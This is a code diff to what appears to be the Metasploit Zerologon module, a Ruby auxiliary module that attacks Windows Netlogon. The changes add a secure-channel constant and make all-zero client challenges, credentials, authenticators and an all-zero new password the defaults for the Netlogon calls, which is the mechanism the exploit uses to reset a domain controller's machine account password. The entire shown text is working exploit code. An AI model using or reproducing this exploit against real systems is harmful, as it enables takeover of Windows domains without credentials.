@@ -12,6 +12,7 @@ class MetasploitModule < Msf::Auxiliary
   CheckCode = Exploit::CheckCode
   Netlogon = RubySMB::Dcerpc::Netlogon
   EMPTY_SHARED_SECRET = OpenSSL::Digest::MD4.digest('')
+  SERVER_SECURE_CHANNEL = 6
 
   def initialize(info = {})
     super(
@@ -151,22 +152,22 @@ class MetasploitModule < Msf::Auxiliary
     print_good("Successfully set machine account (#{datastore['NBNAME']}$) password")
   end
 
-  def netr_server_authenticate3(client_credential: nil)
+  def netr_server_authenticate3(client_credential: "\x00" * 8)
     nrpc_call('NetrServerAuthenticate3',
               primary_name: "\\\\#{datastore['NBNAME']}",
               account_name: "#{datastore['NBNAME']}$",
-              secure_channel_type: 6, # SERVER_SECURE_CHANNEL
+              secure_channel_type: SERVER_SECURE_CHANNEL,
               computer_name: datastore['NBNAME'],
               client_credential: client_credential,
               flags: 0x212fffff)
   end
 
-  def netr_server_password_set2(authenticator: nil, clear_new_password: nil)
-    authenticator ||= Netlogon::NetlogonAuthenticator.new
+  def netr_server_password_set2(authenticator: nil, clear_new_password: "\x00" * 516)
+    authenticator ||= Netlogon::NetlogonAuthenticator.new(credential: "\x00" * 8, timestamp: 0)
     request = NetrServerPasswordSet2Request.new(
       primary_name: "\\\\#{datastore['NBNAME']}",
       account_name: "#{datastore['NBNAME']}$",
-      secure_channel_type: 6, # SERVER_SECURE_CHANNEL
+      secure_channel_type: SERVER_SECURE_CHANNEL,
       computer_name: datastore['NBNAME'],
       authenticator: authenticator,
       clear_new_password: clear_new_password
@@ -174,7 +175,7 @@ class MetasploitModule < Msf::Auxiliary
     dcerpc.call(request.opnum, request.to_binary_s)
   end
 
-  def netr_server_req_challenge(client_challenge: nil)
+  def netr_server_req_challenge(client_challenge: "\x00" * 8)
     nrpc_call('NetrServerReqChallenge',
               primary_name: "\\\\#{datastore['NBNAME']}",
               computer_name: datastore['NBNAME'],
